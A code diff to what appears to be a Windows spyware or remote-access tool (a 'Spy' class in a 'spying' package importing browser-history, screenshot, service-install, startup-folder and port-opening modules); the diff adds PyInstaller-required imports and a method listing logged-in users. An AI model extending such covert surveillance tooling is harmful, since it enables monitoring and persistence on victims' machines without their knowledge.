@@ -3,6 +3,9 @@ import threading
 from datetime import datetime
 from pathlib import Path
 from typing import Optional, Tuple, List
+
+import psutil
+
 from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME, NSSM_PATH, PROTECTED_FILES, PROTECTED_DIRS, \
     SERVICE_PATHS, SERVICE_PATHS, PROJECT_NAME, OVIL_PATH, START_UP_FOLDER, ROOT_DIRECTORY, SERVICE_NAME
 
@@ -21,7 +24,48 @@ from spying.browser import get_browser_info, list_of_history_to_str
 from spying.service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
     install_service, remove_services
 from spying.ports import open_port
-
+# must be here for the pyinstaller:
+from moviepy.audio.fx.audio_fadein import audio_fadein
+from moviepy.audio.fx.audio_fadeout import audio_fadeout
+from moviepy.audio.fx.audio_left_right import audio_left_right
+from moviepy.audio.fx.audio_loop import audio_loop
+from moviepy.audio.fx.audio_normalize import audio_normalize
+from moviepy.audio.fx.volumex import volumex
+from moviepy.video.fx.accel_decel import accel_decel
+from moviepy.video.fx.blackwhite import blackwhite
+from moviepy.video.fx.blink import blink
+from moviepy.video.fx.colorx import colorx
+from moviepy.video.fx.crop import crop
+from moviepy.video.fx.even_size import even_size
+from moviepy.video.fx.fadein import fadein
+from moviepy.video.fx.fadeout import fadeout
+from moviepy.video.fx.freeze import freeze
+from moviepy.video.fx.freeze_region import freeze_region
+from moviepy.video.fx.gamma_corr import gamma_corr
+from moviepy.video.fx.headblur import headblur
+from moviepy.video.fx.invert_colors import invert_colors
+from moviepy.video.fx.loop import loop
+from moviepy.video.fx.lum_contrast import lum_contrast
+from moviepy.video.fx.make_loopable import make_loopable
+from moviepy.video.fx.margin import margin
+from moviepy.video.fx.mask_and import mask_and
+from moviepy.video.fx.mask_color import mask_color
+from moviepy.video.fx.mask_or import mask_or
+from moviepy.video.fx.mirror_x import mirror_x
+from moviepy.video.fx.mirror_y import mirror_y
+from moviepy.video.fx.painting import painting
+from moviepy.video.fx.resize import resize
+from moviepy.video.fx.rotate import rotate
+from moviepy.video.fx.scroll import scroll
+from moviepy.video.fx.speedx import speedx
+from moviepy.video.fx.supersample import supersample
+from moviepy.video.fx.time_mirror import time_mirror
+from moviepy.video.fx.time_symmetrize import time_symmetrize
+import unicrypto.backends.cryptography
+import unicrypto.backends.cryptography.DES
+import unicrypto.backends.cryptography.TDES
+import unicrypto.backends.cryptography.RC4
+import unicrypto.backends.cryptography.AES
 
 class Spy:
     """
@@ -256,6 +300,12 @@ class Spy:
     @staticmethod
     def get_user() -> str:
         return os.getlogin()
+
+    @staticmethod
+    def get_users() -> str:
+        users = {}
+        names = [n.name for n in psutil.users()]
+        return str(names)
 
     @staticmethod
     def get_computer() -> str:
